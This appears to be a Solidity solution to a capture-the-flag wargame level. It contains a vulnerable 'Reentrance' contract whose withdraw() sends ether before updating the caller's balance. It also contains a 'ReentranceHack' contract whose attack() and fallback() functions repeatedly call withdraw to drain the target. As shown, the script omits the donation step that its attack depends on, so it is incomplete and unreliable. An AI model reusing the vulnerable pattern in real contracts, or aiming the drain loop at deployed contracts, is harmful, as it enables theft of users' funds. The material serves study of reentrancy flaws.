// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '/contracts/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{ value: _amount }("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}


contract ReentranceHack {
    Reentrance ogContract = Reentrance(/*your instance address*/);
    
    // initial call to kick things off
    function attack() public {
        if(address(ogContract).balance >= 1 ether) {
            ogContract.withdraw(1 ether);
        }
    }
    
    // when the original contract transfers ether to this contract, it will trigger another withdraw()
    // this will happen until the original contract has 0 ether left.
    fallback() external payable {
        if(address(ogContract).balance >= 1 ether) {
            ogContract.withdraw(1 ether);
        }
    }
    
}